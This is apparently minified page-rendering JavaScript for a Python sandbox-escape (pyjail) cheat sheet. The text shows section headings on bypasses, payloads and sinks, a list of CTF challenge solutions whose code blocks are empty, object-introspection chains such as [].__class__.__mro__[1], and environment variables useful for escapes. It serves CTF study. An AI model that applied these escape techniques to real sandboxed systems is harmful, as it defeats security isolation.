ki=o(M);aa=p(ki,"A",{href:!0});var ri=o(aa);Dc=r(ri,"retrieving builtins"),ri.forEach(s),ki.forEach(s),co=i(n),q=p(n,"PRE",{class:!0});var Tf=o(q);Tf.forEach(s),lo=i(n),N=p(n,"H3",{id:!0});var _i=o(N);ta=p(_i,"A",{href:!0});var di=o(ta);Ic=r(di,"good to know built-in functions and methods"),di.forEach(s),_i.forEach(s),uo=i(n),S=p(n,"PRE",{class:!0});var Ff=o(S);Ff.forEach(s),io=i(n),z=p(n,"H3",{id:!0});var fi=o(z);pa=p(fi,"A",{href:!0});var bi=o(pa);Hc=r(bi,"subclasses"),bi.forEach(s),fi.forEach(s),ko=i(n),Y=p(n,"PRE",{class:!0});var Df=o(Y);Df.forEach(s),ro=i(n),W=p(n,"H3",{id:!0});var yi=o(W);oa=p(yi,"A",{href:!0});var mi=o(oa);Oc=r(mi,"popular modules"),mi.forEach(s),yi.forEach(s),_o=i(n),V=p(n,"PRE",{class:!0});var If=o(V);If.forEach(s),fo=i(n),G=p(n,"H2",{id:!0});var vi=o(G);ea=p(vi,"A",{href:!0});var wi=o(ea);Rc=r(wi,"Bypasses and payloads"),wi.forEach(s),vi.forEach(s),bo=i(n),$=p(n,"H3",{id:!0});var gi=o($);ca=p(gi,"A",{href:!0});var Ei=o(ca);jc=r(Ei,"decorators"),Ei.forEach(s),gi.forEach(s),yo=i(n),X=p(n,"PRE",{class:!0});var Hf=o(X);Hf.forEach(s),mo=i(n),K=p(n,"H3",{id:!0});var hi=o(K);la=p(hi,"A",{href:!0});var xi=o(la);Uc=r(xi,"unicode bypass"),xi.forEach(s),hi.forEach(s),vo=i(n),Z=p(n,"PRE",{class:!0});var Of=o(Z);Of.forEach(s),wo=i(n),J=p(n,"H3",{id:!0});var Li=o(J);ua=p(Li,"A",{href:!0});var Ci=o(ua);Pc=r(Ci,"assigning attributes and variables"),Ci.forEach(s),Li.forEach(s),go=i(n),Q=p(n,"PRE",{class:!0});var Rf=o(Q);Rf.forEach(s),Eo=i(n),nn=p(n,"PRE",{class:!0});var jf=o(nn);jf.forEach(s),ho=i(n),sn=p(n,"H3",{id:!0});var Ai=o(sn);ia=p(Ai,"A",{href:!0});var Ti=o(ia);Bc=r(Ti,"getting attributes without dot"),Ti.forEach(s),Ai.forEach(s),xo=i(n),an=p(n,"PRE",{class:!0});var Uf=o(an);Uf.forEach(s),Lo=i(n),tn=p(n,"PRE",{class:!0});var Pf=o(tn);Pf.forEach(s),Co=i(n),pn=p(n,"H3",{id:!0});var Fi=o(pn);ka=p(Fi,"A",{href:!0});var Di=o(ka);Mc=r(Di,"getting attributes without underscore"),Di.forEach(s),Fi.forEach(s),Ao=i(n),on=p(n,"PRE",{class:!0});var Bf=o(on);Bf.forEach(s),To=i(n),en=p(n,"H3",{id:!0});var Ii=o(en);ra=p(Ii,"A",{href:!0});var Hi=o(ra);qc=r(Hi,"running functions and methods without parenthesis"),Hi.forEach(s),Ii.forEach(s),Fo=i(n),cn=p(n,"PRE",{class:!0});var Mf=o(cn);Mf.forEach(s),Do=i(n),ln=p(n,"PRE",{class:!0});var qf=o(ln);qf.forEach(s),Io=i(n),un=p(n,"H3",{id:!0});var Oi=o(un);_a=p(Oi,"A",{href:!0});var Ri=o(_a);Nc=r(Ri,"deleting variables"),Ri.forEach(s),Oi.forEach(s),Ho=i(n),kn=p(n,"PRE",{class:!0});var Nf=o(kn);Nf.forEach(s),Oo=i(n),rn=p(n,"H2",{id:!0});var ji=o(rn);da=p(ji,"A",{href:!0});var Ui=o(da);Sc=r(Ui,"General stuff"),Ui.forEach(s),ji.forEach(s),Ro=i(n),_n=p(n,"H3",{id:!0});var Pi=o(_n);fa=p(Pi,"A",{href:!0});var Bi=o(fa);zc=r(Bi,"environment variables"),Bi.forEach(s),Pi.forEach(s),jo=i(n),L=p(n,"UL",{class:!0});var xc=o(L);Za=p(xc,"LI",{});var Mi=o(Za);C=p(Mi,"A",{href:!0,rel:!0,class:!0,target:!0});var qi=o(C);Yc=r(qi,"https://www.elttam.com/blog/env/#python"),qi.forEach(s),Mi.forEach(s),Wc=i(xc),m=p(xc,"LI",{});var h=o(m);Ja=p(h,"CODE",{});var Ni=o(Ja);Vc=r(Ni,"PYTHONINSPECT"),Ni.forEach(s),Gc=r(h,", "),Qa=p(h,"CODE",{});var Si=o(Qa);$c=r(Si,"PYTHONHOME"),Si.forEach(s),Xc=r(h,", "),nt=p(h,"CODE",{});var zi=o(nt);Kc=r(zi,"PYTHONPATH"),zi.forEach(s),Zc=r(h,", "),st=p(h,"CODE",{});var Yi=o(st);Jc=r(Yi,"PYTHONWARNINGS"),Yi.forEach(s),Qc=r(h,", "),at=p(h,"CODE",{});var Wi=o(at);nl=r(Wi,"BROWSER"),Wi.forEach(s),h.forEach(s),xc.forEach(s),Uo=i(n),dn=p(n,"H3",{id:!0});var Vi=o(dn);ba=p(Vi,"A",{href:!0});var Gi=o(ba);sl=r(Gi,"magic methods"),Gi.forEach(s),Vi.forEach(s),Po=i(n),fn=p(n,"UL",{class:!0});var $i=o(fn);tt=p($i,"LI",{});var Xi=o(tt);A=p(Xi,"A",{href:!0,rel:!0,class:!0,target:!0});var Ki=o(A);al=r(Ki,"https://rszalski.github.io/magicmethods/#appendix1"),Ki.forEach(s),Xi.forEach(s),$i.forEach(s),Bo=i(n),bn=p(n,"H3",{id:!0});var Zi=o(bn);ya=p(Zi,"A",{href:!0});var Ji=o(ya);tl=r(Ji,"stable payloads"),Ji.forEach(s),Zi.forEach(s),Mo=i(n),yn=p(n,"PRE",{class:!0});var Sf=o(yn);Sf.forEach(s),qo=i(n),mn=p(n,"H3",{id:!0});var Qi=o(mn);ma=p(Qi,"A",{href:!0});var nk=o(ma);pl=r(nk,"finding sinks from modules"),nk.forEach(s),Qi.forEach(s),No=i(n),T=p(n,"UL",{class:!0});var Lc=o(T);pt=p(Lc,"LI",{});var sk=o(pt);F=p(sk,"A",{href:!0,rel:!0,class:!0,target:!0});var ak=o(F);ol=r(ak,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code"),ak.forEach(s),sk.forEach(s),el=i(Lc),ot=p(Lc,"LI",{});var tk=o(ot);D=p(tk,"A",{href:!0,rel:!0,class:!0,target:!0});var pk=o(D);cl=r(pk,"https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code"),pk.forEach(s),tk.forEach(s),Lc.forEach(s),So=i(n),vn=p(n,"H3",{id:!0});var ok=o(vn);va=p(ok,"A",{href:!0});var ek=o(va);ll=r(ek,"bullet points"),ek.forEach(s),ok.forEach(s),zo=i(n),f=p(n,"UL",{class:!0});var b=o(f);j=p(b,"LI",{});var oo=o(j);et=p(oo,"CODE",{});var ck=o(et);ul=r(ck,'f"{65:c}"'),ck.forEach(s),il=r(oo," can format an int to char (equalivant to "),ct=p(oo,"CODE",{});var lk=o(ct);kl=r(lk,'"%c" % 65 == chr(65) == "A"'),lk.forEach(s),rl=r(oo,")"),oo.forEach(s),_l=i(b),wa=p(b,"LI",{});var ni=o(wa);lt=p(ni,"CODE",{});var uk=o(lt);dl=r(uk,'"".encode().fromhex("41").decode()'),uk.forEach(s),fl=r(ni," parses hex into string"),ni.forEach(s),bl=i(b),ga=p(b,"LI",{});var si=o(ga);ut=p(si,"CODE",{});var ik=o(ut);yl=r(ik,"type"),ik.forEach(s),U=p(si,"UL",{class:!0});var Cc=o(U);it=p(Cc,"LI",{});var kk=o(it);kt=p(kk,"CODE",{});var rk=o(kt);ml=r(rk,"[].__class__.__class__"),rk.forEach(s),kk.forEach(s),vl=i(Cc),rt=p(Cc,"LI",{});var _k=o(rt);_t=p(_k,"CODE",{});var dk=o(_t);wl=r(dk,'"".__class__.__class__'),dk.forEach(s),_k.forEach(s),Cc.forEach(s),si.forEach(s),gl=i(b),Ea=p(b,"LI",{});var ai=o(Ea);dt=p(ai,"CODE",{});var fk=o(dt);El=r(fk,"object"),fk.forEach(s),g=p(ai,"UL",{class:!0});var $a=o(g);ft=p($a,"LI",{});var bk=o(ft);bt=p(bk,"CODE",{});var yk=o(bt);hl=r(yk,"[].__class__.__mro__[1]"),yk.forEach(s),bk.forEach(s),xl=i($a),yt=p($a,"LI",{});var mk=o(yt);mt=p(mk,"CODE",{});var vk=o(mt);Ll=r(vk,"[].__class__.__bases__[0]"),vk.forEach(s),mk.forEach(s),Cl=i($a),vt=p($a,"LI",{});var wk=o(vt);wt=p(wk,"CODE",{});var gk=o(wt);Al=r(gk,"[].__class__.__base__"),gk.forEach(s),wk.forEach(s),$a.forEach(s),ai.forEach(s),Tl=i(b),ha=p(b,"LI",{});var ti=o(ha);gt=p(ti,"CODE",{});var Ek=o(gt);Fl=r(Ek,"str"),Ek.forEach(s),E=p(ti,"UL",{class:!0});var Xa=o(E);Et=p(Xa,"LI",{});var hk=o(Et);ht=p(hk,"CODE",{});var xk=o(ht);Dl=r(xk,'"".__class__'),xk.forEach(s),hk.forEach(s),Il=i(Xa),xt=p(Xa,"LI",{});var Lk=o(xt);Lt=p(Lk,"CODE",{});var Ck=o(Lt);Hl=r(Ck,"[].__doc__.__class__"),Ck.forEach(s),Lk.forEach(s),Ol=i(Xa),Ct=p(Xa,"LI",{});var Ak=o(Ct);At=p(Ak,"CODE",{});var Tk=o(At);Rl=r(Tk,"[].__class__.__module__.__class__"),Tk.forEach(s),Ak.forEach(s),Xa.forEach(s),ti.forEach(s),jl=i(b),xa=p(b,"LI",{});var pi=o(xa);Tt=p(pi,"CODE",{});var Fk=o(Tt);Ul=r(Fk,"tuple"),Fk.forEach(s),La=p(pi,"UL",{class:!0});var Dk=o(La);Ft=p(Dk,"LI",{});var Ik=o(Ft);Dt=p(Ik,"CODE",{});var Hk=o(Dt);Pl=r(Hk,"[].__class__.__bases__.__class__"),Hk.forEach(s),Ik.forEach(s),Dk.forEach(s),pi.forEach(s),Bl=i(b),Ca=p(b,"LI",{});var oi=o(Ca);It=p(oi,"CODE",{});var Ok=o(It);Ml=r(Ok,"dict"),Ok.forEach(s),P=p(oi,"UL",{class:!0});var Ac=o(P);Ht=p(Ac,"LI",{});var Rk=o(Ht);Ot=p(Rk,"CODE",{});var jk=o(Ot);ql=r(jk,"{}.__class__"),jk.forEach(s),Rk.forEach(s),Nl=i(Ac),Rt=p(Ac,"LI",{});var Uk=o(Rt);jt=p(Uk,"CODE",{});var Pk=o(jt);Sl=r(Pk,"obj.__dict__.__class__"),Pk.forEach(s),Uk.forEach(s),Ac.forEach(s),oi.forEach(s),zl=i(b),wn=p(b,"LI",{});var Tc=o(wn);Ut=p(Tc,"CODE",{});var Bk=o(Ut);Yl=r(Bk,"class instances"),Bk.forEach(s),Wl=r(Tc,":"),B=p(Tc,"UL",{class:!0});var Fc=o(B);Aa=p(Fc,"LI",{});var ei=o(Aa);Pt=p(ei,"CODE",{});var Mk=o(Pt);Vl=r(Mk,"class cobj:..."),Mk.forEach(s),Ta=p(ei,"UL",{class:!0});var qk=o(Ta);Bt=p(qk,"LI",{});var Nk=o(Bt);Mt=p(Nk,"CODE",{});var Sk=o(Mt);Gl=r(Sk,"obj = cobj()"),Sk.forEach(s),Nk.forEach(s),qk.forEach(s),ei.forEach(s),$l=i(Fc),qt=p(Fc,"LI",{});var zk=o(qt);Nt=p(zk,"CODE",{});var Yk=o(Nt);Xl=r(Yk,'type("cobj", (object,), {})()'),Yk.forEach(s),zk.forEach(s),Fc.forEach(s),Tc.forEach(s),b.forEach(s),Yo=i(n),gn=p(n,"H2",{id:!0});var Wk=o(gn);Fa=p(Wk,"A",{href:!0});var Vk=o(Fa);Kl=r(Vk,"CTF"),Vk.forEach(s),Wk.forEach(s),Wo=i(n),En=p(n,"H3",{id:!0});var Gk=o(En);Da=p(Gk,"A",{href:!0});var $k=o(Da);Zl=r($k,"vsCTF 2024: llama-jail-revenge"),$k.forEach(s),Gk.forEach(s),Vo=i(n),hn=p(n,"UL",{class:!0});var Xk=o(hn);St=p(Xk,"LI",{});var Kk=o(St);zt=p(Kk,"CODE",{});var Zk=o(zt);Jl=r(Zk,"chall.py"),Zk.forEach(s),Kk.forEach(s),Xk.forEach(s),Go=i(n),xn=p(n,"PRE",{class:!0});var zf=o(xn);zf.forEach(s),$o=i(n),Ln=p(n,"UL",{class:!0});var Jk=o(Ln);Yt=p(Jk,"LI",{});var Qk=o(Yt);Wt=p(Qk,"CODE",{});var nr=o(Wt);Ql=r(nr,"exec_utils.py"),nr.forEach(s),Qk.forEach(s),Jk.forEach(s),Xo=i(n),Cn=p(n,"PRE",{class:!0});var Yf=o(Cn);Yf.forEach(s),Ko=i(n),An=p(n,"UL",{class:!0});var sr=o(An);Vt=p(sr,"LI",{});var ar=o(Vt);Gt=p(ar,"CODE",{});var tr=o(Gt);nu=r(tr,"solve.py"),tr.forEach(s),ar.forEach(s),sr.forEach(s),Zo=i(n),Tn=p(n,"PRE",{class:!0});var Wf=o(Tn);Wf.forEach(s),Jo=i(n),Fn=p(n,"H3",{id:!0});var pr=o(Fn);Ia=p(pr,"A",{href:!0});var or=o(Ia);su=r(or,"GlacierCTF 2023: Avatar"),or.forEach(s),pr.forEach(s),Qo=i(n),Dn=p(n,"UL",{class:!0});var er=o(Dn);$t=p(er,"LI",{});var cr=o($t);Xt=p(cr,"CODE",{});var lr=o(Xt);au=r(lr,"server.py"),lr.forEach(s),cr.forEach(s),er.forEach(s),ne=i(n),In=p(n,"PRE",{class:!0});var Vf=o(In);Vf.forEach(s),se=i(n),Hn=p(n,"UL",{class:!0});var ur=o(Hn);Kt=p(ur,"LI",{});var ir=o(Kt);Zt=p(ir,"CODE",{});var kr=o(Zt);tu=r(kr,"solve.py"),kr.forEach(s),ir.forEach(s),ur.forEach(s),ae=i(n),On=p(n,"PRE",{class:!0});var Gf=o(On);Gf.forEach(s),te=i(n),Rn=p(n,"H3",{id:!0});var rr=o(Rn);Ha=p(rr,"A",{href:!0});var _r=o(Ha);pu=r(_r,"TFC CTF 2023: My Third Calculator"),_r.forEach(s),rr.forEach(s),pe=i(n),jn=p(n,"UL",{class:!0});var dr=o(jn);Jt=p(dr,"LI",{});var fr=o(Jt);Qt=p(fr,"CODE",{});var br=o(Qt);ou=r(br,"server.py"),br.forEach(s),fr.forEach(s),dr.forEach(s),oe=i(n),Un=p(n,"PRE",{class:!0});var $f=o(Un);$f.forEach(s),ee=i(n),Pn=p(n,"UL",{class:!0});var yr=o(Pn);np=p(yr,"LI",{});var mr=o(np);sp=p(mr,"CODE",{});var vr=o(sp);eu=r(vr,"solve.py"),vr.forEach(s),mr.forEach(s),yr.forEach(s),ce=i(n),Bn=p(n,"PRE",{class:!0});var Xf=o(Bn);Xf.forEach(s),le=i(n),Mn=p(n,"H3",{id:!0});var wr=o(Mn);Oa=p(wr,"A",{href:!0});var gr=o(Oa);cu=r(gr,"Equinor CTF 2023: Dis is it!"),gr.forEach(s),wr.forEach(s),ue=i(n),qn=p(n,"UL",{class:!0});var Er=o(qn);ap=p(Er,"LI",{});var hr=o(ap);tp=p(hr,"CODE",{});var xr=o(tp);lu=r(xr,"main.py"),xr.forEach(s),hr.forEach(s),Er.forEach(s),ie=i(n),Nn=p(n,"PRE",{class:!0});var Kf=o(Nn);Kf.forEach(s),ke=i(n),Sn=p(n,"UL",{class:!0});var Lr=o(Sn);pp=p(Lr,"LI",{});var Cr=o(pp);op=p(Cr,"CODE",{});var Ar=o(op);uu=r(Ar,"solve.py"),Ar.forEach(s),Cr.forEach(s),Lr.forEach(s),re=i(n),zn=p(n,"PRE",{class:!0});var Zf=o(zn);Zf.forEach(s),_e=i(n),Yn=p(n,"H3",{id:!0});var Tr=o(Yn);Ra=p(Tr,"A",{href:!0});var Fr=o(Ra);iu=r(Fr,"37C3 Potluck CTF: tacocat"),Fr.forEach(s),Tr.forEach(s),de=i(n),Wn=p(n,"UL",{class:!0});var Dr=o(Wn);ep=p(Dr,"LI",{});var Ir=o(ep);cp=p(Ir,"CODE",{});var Hr=o(cp);ku=r(Hr,"main.py"),Hr.forEach(s),Ir.forEach(s),Dr.forEach(s),fe=i(n),Vn=p(n,"PRE",{class:!0});var Jf=o(Vn);Jf.forEach(s),be=i(n),Gn=p(n,"UL",{class:!0});var Or=o(Gn);lp=p(Or,"LI",{});var Rr=o(lp);up=p(Rr,"CODE",{});var jr=o(up);ru=r(jr,"solve.py"),jr.forEach(s),Rr.forEach(s),Or.forEach(s),ye=i(n),$n=p(n,"PRE",{class:!0});var Qf=o($n);Qf.forEach(s),me=i(n),Xn=p(n,"H3",{id:!0});var Ur=o(Xn);ja=p(Ur,"A",{href:!0});var Pr=o(ja);_u=r(Pr,"Internet Festival 2023 CTF Finals: prison"),Pr.forEach(s),Ur.forEach(s),ve=i(n),Kn=p(n,"UL",{class:!0});var Br=o(Kn);ip=p(Br,"LI",{});var Mr=o(ip);kp=p(Mr,"CODE",{});var qr=o(kp);du=r(qr,"prison.py"),qr.forEach(s),Mr.forEach(s),Br.forEach(s),we=i(n),Zn=p(n,"PRE",{class:!0});var nb=o(Zn);nb.forEach(s),ge=i(n),Jn=p(n,"UL",{class:!0});var Nr=o(Jn);rp=p(Nr,"LI",{});var Sr=o(rp);_p=p(Sr,"CODE",{});var zr=o(_p);fu=r(zr,"solve.py"),zr.forEach(s),Sr.forEach(s),Nr.forEach(s),Ee=i(n),Qn=p(n,"PRE",{class:!0});var sb=o(Qn);sb.forEach(s),he=i(n),ns=p(n,"H3",{id:!0});var Yr=o(ns);Ua=p(Yr,"A",{href:!0});var Wr=o(Ua);bu=r(Wr,"WACON 2023 Prequal: ScavengerHunt"),Wr.forEach(s),Yr.forEach(s),xe=i(n),ss=p(n,"UL",{class:!0});var Vr=o(ss);dp=p(Vr,"LI",{});var Gr=o(dp);fp=p(Gr,"CODE",{});var $r=o(fp);yu=r($r,"prob.py"),$r.forEach(s),Gr.forEach(s),Vr.forEach(s),Le=i(n),as=p(n,"PRE",{class:!0});var ab=o(as);ab.forEach(s),Ce=i(n),ts=p(n,"UL",{class:!0});var Xr=o(ts);bp=p(Xr,"LI",{});var Kr=o(bp);yp=p(Kr,"CODE",{});var Zr=o(yp);mu=r(Zr,"secret.py"),Zr.forEach(s),Kr.forEach(s),Xr.forEach(s),Ae=i(n),ps=p(n,"PRE",{class:!0});var tb=o(ps);tb.forEach(s),Te=i(n),os=p(n,"UL",{class:!0});var Jr=o(os);mp=p(Jr,"LI",{});var Qr=o(mp);vp=p(Qr,"CODE",{});var n_=o(vp);vu=r(n_,"solve.py"),n_.forEach(s),Qr.forEach(s),Jr.forEach(s),Fe=i(n),es=p(n,"PRE",{class:!0});var pb=o(es);pb.forEach(s),De=i(n),cs=p(n,"H3",{id:!0});var s_=o(cs);Pa=p(s_,"A",{href:!0});var a_=o(Pa);wu=r(a_,"CrewCTF 2023: starship-1"),a_.forEach(s),s_.forEach(s),Ie=i(n),ls=p(n,"UL",{class:!0});var t_=o(ls);wp=p(t_,"LI",{});var p_=o(wp);gp=p(p_,"CODE",{});var o_=o(gp);gu=r(o_,"sandbox.py"),o_.forEach(s),p_.forEach(s),t_.forEach(s),He=i(n),us=p(n,"PRE",{class:!0});var ob=o(us);ob.forEach(s),Oe=i(n),is=p(n,"UL",{class:!0});var e_=o(is);Ep=p(e_,"LI",{});var c_=o(Ep);hp=p(c_,"CODE",{});var l_=o(hp);Eu=r(l_,"solve.py"),l_.forEach(s),c_.forEach(s),e_.forEach(s),Re=i(n),ks=p(n,"PRE",{class:!0});var eb=o(ks);eb.forEach(s),je=i(n),rs=p(n,"H3",{id:!0});var u_=o(rs);Ba=p(u_,"A",{href:!0});var i_=o(Ba);hu=r(i_,"CrewCTF 2023: starship"),i_.forEach(s),u_.forEach(s),Ue=i(n),_s=p(n,"UL",{class:!0});var k_=o(_s);xp=p(k_,"LI",{});var r_=o(xp);Lp=p(r_,"CODE",{});var __=o(Lp);xu=r(__,"solve.py"),__.forEach(s),r_.forEach(s),k_.forEach(s),Pe=i(n),ds=p(n,"PRE",{class:!0});var cb=o(ds);cb.forEach(s),Be=i(n),fs=p(n,"H3",{id:!0});var d_=o(fs);Ma=p(d_,"A",{href:!0});var f_=o(Ma);Lu=r(f_,"CrewCTF 2023: setjail"),f_.forEach(s),d_.forEach(s),Me=i(n),bs=p(n,"UL",{class:!0});var b_=o(bs);Cp=p(b_,"LI",{});var y_=o(Cp);Ap=p(y_,"CODE",{});var m_=o(Ap);Cu=r(m_,"solve.py"),m_.forEach(s),y_.forEach(s),b_.forEach(s),qe=i(n),ys=p(n,"PRE",{class:!0});var lb=o(ys);lb.forEach(s),Ne=i(n),ms=p(n,"H3",{id:!0});var v_=o(ms);qa=p(v_,"A",{href:!0});var w_=o(qa);Au=r(w_,"BYUCTF 2023: Builtins 1"),w_.forEach(s),v_.forEach(s),Se=i(n),vs=p(n,"UL",{class:!0});var g_=o(vs);Tp=p(g_,"LI",{});var E_=o(Tp);Fp=p(E_,"CODE",{});var h_=o(Fp);Tu=r(h_,"b1.py"),h_.forEach(s),E_.forEach(s),g_.forEach(s),ze=i(n),ws=p(n,"PRE",{class:!0});var ub=o(ws);ub.forEach(s),Ye=i(n),gs=p(n,"UL",{class:!0});var x_=o(gs);Dp=p(x_,"LI",{});var L_=o(Dp);Ip=p(L_,"CODE",{});var C_=o(Ip);Fu=r(C_,"solve.py"),C_.forEach(s),L_.forEach(s),x_.forEach(s),We=i(n),Es=p(n,"PRE",{class:!0});var ib=o(Es);ib.forEach(s),Ve=i(n),hs=p(n,"H3",{id:!0});var A_=o(hs);Na=p(A_,"A",{href:!0});var T_=o(Na);Du=r(T_,"BYUCTF 2023: Builtins 2"),T_.forEach(s),A_.forEach(s),Ge=i(n),xs=p(n,"UL",{class:!0});var F_=o(xs);Hp=p(F_,"LI",{});var D_=o(Hp);Op=p(D_,"CODE",{});var I_=o(Op);Iu=r(I_,"b2.py"),I_.forEach(s),D_.forEach(s),F_.forEach(s),$e=i(n),Ls=p(n,"PRE",{class:!0});var kb=o(Ls);kb.forEach(s),Xe=i(n),Cs=p(n,"UL",{class:!0});var H_=o(Cs);Rp=p(H_,"LI",{});var O_=o(Rp);jp=p(O_,"CODE",{});var R_=o(jp);Hu=r(R_,"solve.py"),R_.forEach(s),O_.forEach(s),H_.forEach(s),Ke=i(n),As=p(n,"PRE",{class:!0});var rb=o(As);rb.forEach(s),Ze=i(n),Ts=p(n,"H3",{id:!0});var j_=o(Ts);Sa=p(j_,"A",{href:!0});var U_=o(Sa);Ou=r(U_,"BYUCTF 2023: a-z0-9"),U_.forEach(s),j_.forEach(s),Je=i(n),Fs=p(n,"UL",{class:!0});var P_=o(Fs);Up=p(P_,"LI",{});var B_=o(Up);Pp=p(B_,"CODE",{});var M_=o(Pp);Ru=r(M_,"a-z0-9.py"),M_.forEach(s),B_.forEach(s),P_.forEach(s),Qe=i(n),Ds=p(n,"PRE",{class:!0});var _b=o(Ds);_b.forEach(s),nc=i(n),Is=p(n,"UL",{class:!0});var q_=o(Is);Bp=p(q_,"LI",{});var N_=o(Bp);Mp=p(N_,"CODE",{});var S_=o(Mp);ju=r(S_,"solve.py"),S_.forEach(s),N_.forEach(s),q_.forEach(s),sc=i(n),Hs=p(n,"PRE",{class:!0});var db=o(Hs);db.forEach(s),ac=i(n),Os=p(n,"H3",{id:!0});var z_=o(Os);za=p(z_,"A",{href:!0});var Y_=o(za);Uu=r(Y_,"BYUCTF 2023: Leet 1"),Y_.forEach(s),z_.forEach(s),tc=i(n),Rs=p(n,"UL",{class:!0});var W_=o(Rs);qp=p(W_,"LI",{});var V_=o(qp);Np=p(V_,"CODE",{});var G_=o(Np);Pu=r(G_,"leet1.py"),G_.forEach(s),V_.forEach(s),W_.forEach(s),pc=i(n),js=p(n,"PRE",{class:!0});var fb=o(js);fb.forEach(s),oc=i(n),Us=p(n,"UL",{class:!0});var $_=o(Us);Sp=p($_,"LI",{});var X_=o(Sp);zp=p(X_,"CODE",{});var K_=o(zp);Bu=r(K_,"solve.py"),K_.forEach(s),X_.forEach(s),$_.forEach(s),ec=i(n),Ps=p(n,"PRE",{class:!0});var bb=o(Ps);bb.forEach(s),cc=i(n),Bs=p(n,"H3",{id:!0});var Z_=o(Bs);Ya=p(Z_,"A",{href:!0});var J_=o(Ya);Mu=r(J_,"BYUCTF 2023: Leet 2"),J_.forEach(s),Z_.forEach(s),lc=i(n),Ms=p(n,"UL",{class:!0});var Q_=o(Ms);Yp=p(Q_,"LI",{});var nd=o(Yp);Wp=p(nd,"CODE",{});var sd=o(Wp);qu=r(sd,"leet2.py"),sd.forEach(s),nd.forEach(s),Q_.forEach(s),uc=i(n),qs=p(n,"PRE",{class:!0});var yb=o(qs);yb.forEach(s),ic=i(n),Ns=p(n,"UL",{class:!0});var ad=o(Ns);Vp=p(ad,"LI",{});var td=o(Vp);Gp=p(td,"CODE",{});var pd=o(Gp);Nu=r(pd,"solve.py"),pd.forEach(s),td.forEach(s),ad.forEach(s),kc=i(n),Ss=p(n,"PRE",{class:!0});var mb=o(Ss);mb.forEach(s),rc=i(n),zs=p(n,"H3",{id:!0});var od=o(zs);Wa=p(od,"A",{href:!0});var ed=o(Wa);Su=r(ed,"BYUCTF 2023: abcdefghijklm"),ed.forEach(s),od.forEach(s),_c=i(n),Ys=p(n,"UL",{class:!0});var cd=o(Ys);$p=p(cd,"LI",{});var ld=o($p);Xp=p(ld,"CODE",{});var ud=o(Xp);zu=r(ud,"abcdefghijklm.py"),ud.forEach(s),ld.forEach(s),cd.forEach(s),dc=i(n),Ws=p(n,"PRE",{class:!0});var vb=o(Ws);vb.forEach(s),fc=i(n),Vs=p(n,"UL",{class:!0});var id=o(Vs);Kp=p(id,"LI",{});var kd=o(Kp);Zp=p(kd,"CODE",{});var rd=o(Zp);Yu=r(rd,"solve.py"),rd.forEach(s),kd.forEach(s),id.forEach(s),bc=i(n),Gs=p(n,"PRE",{class:!0});var wb=o(Gs);wb.forEach(s),yc=i(n),$s=p(n,"H3",{id:!0});var _d=o($s);Va=p(_d,"A",{href:!0});var dd=o(Va);Wu=r(dd,"BYUCTF 2023: nopqrstuvwxyz"),dd.forEach(s),_d.forEach(s),mc=i(n),Xs=p(n,"UL",{class:!0});var fd=o(Xs);Jp=p(fd,"LI",{});var bd=o(Jp);Qp=p(bd,"CODE",{});var yd=o(Qp);Vu=r(yd,"nopqrstuvwxyz.py"),yd.forEach(s),bd.forEach(s),fd.forEach(s),vc=i(n),Ks=p(n,"PRE",{class:!0});var gb=o(Ks);gb.forEach(s),wc=i(n),Zs=p(n,"UL",{class:!0});var md=o(Zs);no=p(md,"LI",{});var vd=o(no);so=p(vd,"CODE",{});var wd=o(so);Gu=r(wd,"solve.py"),wd.forEach(s),vd.forEach(s),md.forEach(s),gc=i(n),Js=p(n,"PRE",{class:!0});var Eb=o(Js);Eb.forEach(s),Ec=i(n),Qs=p(n,"H2",{id:!0});var gd=o(Qs);Ga=p(gd,"A",{href:!0});var Ed=o(Ga);$u=r(Ed,"References"),Ed.forEach(s),gd.forEach(s),hc=i(n),w=p(n,"UL",{class:!0});var Ka=o(w);ao=p(Ka,"LI",{});var hd=o(ao);I=p(hd,"A",{href:!0,rel:!0,class:!0,target:!0});var xd=o(I);Xu=r(xd,"https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes"),xd.forEach(s),hd.forEach(s),Ku=i(Ka),to=p(Ka,"LI",{});var Ld=o(to);H=p(Ld,"A",{href:!0,rel:!0,class:!0,target:!0});var Cd=o(H);Zu=r(Cd,"https://github.com/salvatore-abello/python-ctf-cheatsheet/blob/main/pyjails/README.md"),Cd.forEach(s),Ld.forEach(s),Ju=i(Ka),po=p(Ka,"LI",{});var Ad=o(po);O=p(Ad,"A",{href:!0,rel:!0,class:!0,target:!0});var Td=o(O);Qu=r(Td,"https://jbnrz.com.cn/index.php/2024/05/19/pyjail/"),Td.forEach(s),Ad.forEach(s),Ka.forEach(s),this.h()},h(){l(y,"href","#sinks"),l(_,"id","sinks"),l(aa,"href","#retrieving-builtins"),l(M,"id","retrieving-builtins"),l(q,"class","language-py"),l(ta,"href","#good-to-know-built-in-functions-and-methods"),l(N,"id","good-to-know-built-in-functions-and-methods"),l(S,"class","language-py"),l(pa,"href","#subclasses"),l(z,"id","subclasses"),l(Y,"class","language-py"),l(oa,"href","#popular-modules"),l(W,"id","popular-modules"),l(V,"class","language-py"),l(ea,"href","#bypasses-and-payloads"),l(G,"id","bypasses-and-payloads"),l(ca,"href","#decorators"),l($,"id","decorators"),l(X,"class","language-py"),l(la,"href","#unicode-bypass"),l(K,"id","unicode-bypass"),l(Z,"class","language-py"),l(ua,"href","#assigning-attributes-and-variables"),l(J,"id","assigning-attributes-and-variables"),l(Q,"class","language-py"),l(nn,"class","language-py"),l(ia,"href","#getting-attributes-without-dot"),l(sn,"id","getting-attributes-without-dot"),l(an,"class","language-py"),l(tn,"class","language-py"),l(ka,"href","#getting-attributes-without-underscore"),l(pn,"id","getting-attributes-without-underscore"),l(on,"class","language-py"),l(ra,"href","#running-functions-and-methods-without-parenthesis"),l(en,"id","running-functions-and-methods-without-parenthesis"),l(cn,"class","language-py"),l(ln,"class","language-py"),l(_a,"href","#deleting-variables"),l(un,"id","deleting-variables"),l(kn,"class","language-py"),l(da,"href","#general-stuff"),l(rn,"id","general-stuff"),l(fa,"href","#environment-variables"),l(_n,"id","environment-variables"),l(C,"href","https://www.elttam.com/blog/env/#python"),l(C,"rel","noopener"),l(C,"class","text-link"),l(C,"target","_blank"),l(L,"class","list"),l(ba,"href","#magic-methods"),l(dn,"id","magic-methods"),l(A,"href","https://rszalski.github.io/magicmethods/#appendix1"),l(A,"rel","noopener